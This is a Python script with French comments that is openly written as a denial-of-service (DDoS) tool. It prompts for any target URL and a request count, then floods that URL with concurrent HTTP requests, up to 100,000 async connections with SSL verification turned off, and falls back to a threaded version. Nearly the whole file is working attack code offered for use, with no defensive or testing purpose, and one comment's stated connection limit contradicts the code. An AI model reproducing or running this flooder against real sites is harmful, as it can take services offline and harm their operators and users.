import requests
import time
from concurrent.futures import ThreadPoolExecutor
import asyncio
import aiohttp

# Version asynchrone (beaucoup plus rapide)
async def async_ddos_attack():
    url = input("Entrez l'URL à attaquer : ")
    nombre_requetes = int(input("Combien de requêtes envoyer ? "))
    concurrence = min(100000, nombre_requetes)  # Limiter à 500 connexions simultanées
    
    print(f"Démarrage de l'attaque avec {concurrence} connexions simultanées...")
    start_time = time.time()
    
    # Fonction asynchrone pour envoyer une requête
    async def envoyer_requete_async(session, num):
        try:
            async with session.get(url, timeout=5) as response:
                if num % 100 == 0 or num < 10:  # Afficher seulement certaines requêtes pour éviter de spammer la console
                    print(f"Requête {num}/{nombre_requetes} : Statut {response.status}")
                return True
        except Exception as e:
            if num % 100 == 0 or num < 10:
                print(f"Erreur requête {num} : {str(e)}")
            return False
    
    # Créer une seule session pour toutes les requêtes
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=concurrence, ssl=False)) as session:
        # Créer les tâches
        tasks = [envoyer_requete_async(session, i+1) for i in range(nombre_requetes)]
        
        # Diviser en lots pour éviter les problèmes de mémoire avec un très grand nombre de requêtes
        batch_size = 1000
        successful = 0
        
        for i in range(0, len(tasks), batch_size):
            batch = tasks[i:i+batch_size]
            results = await asyncio.gather(*batch, return_exceptions=True)
            successful += sum(1 for r in results if r is True)
            
            # Afficher la progression
            progress = min(100, int((i + len(batch)) / nombre_requetes * 100))
            print(f"Progression : {progress}% ({i + len(batch)}/{nombre_requetes})")
    
    duration = time.time() - start_time
    
    print(f"\nAttaque terminée en {duration:.2f} secondes")
    print(f"Requêtes réussies : {successful}/{nombre_requetes}")
    print(f"Vitesse moyenne : {nombre_requetes/duration:.2f} requêtes/seconde")

# Version synchrone simplifiée (fallback si aiohttp n'est pas disponible)
def ddos_attack():
    try:
        # Essayer d'utiliser la version asynchrone (beaucoup plus rapide)
        asyncio.run(async_ddos_attack())
    except ImportError:
        # Fallback vers la version synchrone si aiohttp n'est pas installé
        print("Module aiohttp non trouvé. Utilisation de la méthode plus lente.")
        
        url = input("Entrez l'URL à attaquer : ")
        nombre_requetes = int(input("Combien de requêtes envoyer ? "))
        max_workers = min(200, nombre_requetes)
        
        start_time = time.time()
        success_count = 0
        
        def envoyer_requete(num):
            try:
                response = requests.get(url, timeout=5)
                if num % 50 == 0 or num < 5:
                    print(f"Requête {num}/{nombre_requetes} : Statut {response.status_code}")
                return True
            except Exception as e:
                if num % 50 == 0 or num < 5:
                    print(f"Erreur requête {num} : {str(e)}")
                return False
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(envoyer_requete, i+1) for i in range(nombre_requetes)]
            
            for i, future in enumerate(futures):
                try:
                    if future.result():
                        success_count += 1
                except Exception:
                    pass
                
                if (i+1) % 100 == 0:
                    print(f"Progression : {int((i+1)/nombre_requetes*100)}% ({i+1}/{nombre_requetes})")
        
        duration = time.time() - start_time
        print(f"\nAttaque terminée en {duration:.2f} secondes")
        print(f"Requêtes réussies : {success_count}/{nombre_requetes}")
        print(f"Vitesse moyenne : {nombre_requetes/duration:.2f} requêtes/seconde")

# Pour l'utiliser dans votre script, vous devrez installer aiohttp:
# pip install aiohttp
